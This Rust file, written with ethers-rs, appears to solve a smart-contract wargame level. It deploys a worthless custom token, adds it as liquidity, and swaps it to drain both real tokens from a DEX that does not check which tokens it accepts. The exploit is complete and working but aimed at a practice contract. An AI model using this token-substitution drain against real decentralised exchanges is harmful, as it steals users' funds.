use crate::types::*;
use crate::utils;
use ethers::prelude::*;
use ethers::utils::{compile, Solc};
use ethers_core::abi::{Token, Tokenize};
use std::error::Error;
use std::sync::Arc;

abigen!(
    LevelContract,
    r#"[
        function token1() public returns (address)
        function token2() public returns (address)
        function swap(address, address, uint) public
        function add_liquidity(address, uint) public
    ]"#,
);

abigen!(
    TokenContract,
    r#"[
        function approve(address, uint256) public virtual returns (bool)
    ]"#,
);

struct ConstructorArguments {
    name: Token,
    symbol: Token,
    initialSupply: Token,
}

impl Tokenize for ConstructorArguments {
    fn into_tokens(self) -> Vec<Token> {
        return vec![self.name, self.symbol, self.initialSupply];
    }
}

pub async fn solve(level: &Level, config: &EnvironmentConfig) -> Result<(), Box<dyn Error>> {
    let client = Arc::new(utils::create_signer_middleware(
        config.wallet_mnemonic_path.clone(),
        config.network.chain_id,
        config.network.rpc.clone(),
    )?);

    let compiled = compile(Solc::new("./contracts/**/*.sol")).await?;
    let solution_contract = compiled
        .get("Solution")
        .expect("could not find solution contract");
    let factory = ContractFactory::new(
        solution_contract.abi.clone(),
        solution_contract.bytecode.clone(),
        client.clone(),
    );
    println!("Deploying solution contract");
    let contract = factory
        .deploy(ConstructorArguments {
            name: Token::String(String::from("Token 3")),
            symbol: Token::String(String::from("TOKEN3")),
            initialSupply: Token::Uint(U256::from_dec_str("4")?),
        })?
        .legacy()
        .send()
        .await?;
    let token3_address = contract.address();
    println!("Solution contract deployed at {}\n", token3_address);

    let level_address = level.instance.parse::<Address>()?;
    let level_contract = LevelContract::new(level_address, client.clone());
    let token1_address = level_contract.token_1().legacy().call().await?;
    let token2_address = level_contract.token_2().legacy().call().await?;
    println!("token1 address: {}", token1_address);
    println!("token2 address: {}", token2_address);
    println!("token3 address: {}", token3_address);

    println!("approving token1");
    let token1_contract = TokenContract::new(token1_address, client.clone());
    let receipt = token1_contract
        .approve(level_address, U256::from_dec_str("1000")?)
        .legacy()
        .send()
        .await?
        .await?;
    println!(
        "token1 approve:\n{}",
        serde_json::to_string_pretty(&receipt)?
    );
    println!("approving token2");
    let token2_contract = TokenContract::new(token2_address, client.clone());
    let receipt = token2_contract
        .approve(level_address, U256::from_dec_str("1000")?)
        .legacy()
        .send()
        .await?
        .await?;
    println!(
        "token2 approve:\n{}",
        serde_json::to_string_pretty(&receipt)?
    );
    println!("approving token3");
    let token3_contract = TokenContract::new(token3_address, client.clone());
    let receipt = token3_contract
        .approve(level_address, U256::from_dec_str("1000")?)
        .legacy()
        .send()
        .await?
        .await?;
    println!(
        "token3 approve:\n{}",
        serde_json::to_string_pretty(&receipt)?
    );

    let receipt = level_contract
        .add_liquidity(token3_address, U256::from_dec_str("1")?)
        .legacy()
        .send()
        .await?
        .await?;
    println!(
        "add token3 liquidity:\n{}",
        serde_json::to_string_pretty(&receipt)?
    );

    let receipt = level_contract
        .swap(token3_address, token1_address, U256::from_dec_str("1")?)
        .legacy()
        .send()
        .await?
        .await?;
    println!("swap token1:\n{}", serde_json::to_string_pretty(&receipt)?);
    let receipt = level_contract
        .swap(token3_address, token2_address, U256::from_dec_str("2")?)
        .legacy()
        .send()
        .await?
        .await?;
    println!("swap token2:\n{}", serde_json::to_string_pretty(&receipt)?);

    Ok(())
}
